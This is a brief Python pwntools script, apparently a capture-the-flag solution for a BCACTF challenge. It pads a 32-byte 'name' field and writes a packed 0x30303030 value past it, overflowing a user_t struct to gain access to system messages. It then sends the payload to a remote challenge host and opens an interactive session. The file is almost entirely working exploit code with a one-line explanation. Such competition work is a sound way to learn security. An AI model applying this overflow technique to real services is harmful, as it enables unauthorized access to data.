"""
Overflow the "name" field from the user_t struct and add an '0x30303030' (#0000) tag so we can read system messages 
"""

from pwn import *


payload = str("Ducky Duck" * 5)[:32].encode('utf-8') + p64(0x30303030) 

# print(payload)

c = remote('challs.bcactf.com', 30184)

c.sendline(payload)

c.interactive()